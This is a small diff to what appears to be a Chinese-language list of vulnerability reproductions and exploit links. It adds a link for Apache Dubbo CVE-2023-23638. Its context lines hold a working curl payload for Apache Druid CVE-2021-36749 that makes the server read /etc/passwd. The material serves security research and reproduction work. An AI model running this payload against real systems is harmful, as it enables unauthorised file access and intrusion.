@@ -324,6 +324,10 @@ CVE-2021-36749
 curl http://127.0.0.1:8888/druid/indexer/v1/sampler?for=connect -H "Content-Type:application/json" -X POST -d "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\" file:///etc/passwd \"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\", \"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"no_ such_ column\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"
 ```
 
+## Apache Dubbo
+
+[Apache Dubbo (CVE-2023-23638)漏洞利用的工程化实践](https://github.com/YYHYlh/Apache-Dubbo-CVE-2023-23638-exp)
+
 ## Apache Flink
 
 [CVE-2020-17518&17519：Flink两个漏洞复现](https://mp.weixin.qq.com/s/9xLQ1YAWVtHBv9qVk-Xc1A)
